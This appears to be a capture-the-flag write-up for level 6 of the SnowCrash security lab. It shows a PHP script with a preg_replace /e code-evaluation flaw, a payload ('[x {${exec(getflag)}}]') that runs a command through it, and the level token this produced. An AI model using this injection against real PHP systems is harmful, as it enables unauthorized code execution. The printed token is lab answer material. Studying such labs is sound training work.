# Level06

There is a php file and an executable
```
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

```
level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/script
level06@SnowCrash:~$ cat /tmp/script
echo [x {${exec(getflag)}}]
level06@SnowCrash:~$ ./level06 /tmp/script
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
echo 
```

`$a = file_get_contents($y);`: this part gets the content of $y
`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);` this part take what is contains between [x ... ] and `/e` evaluate the code and execute `y({${exec(getflag)}})`
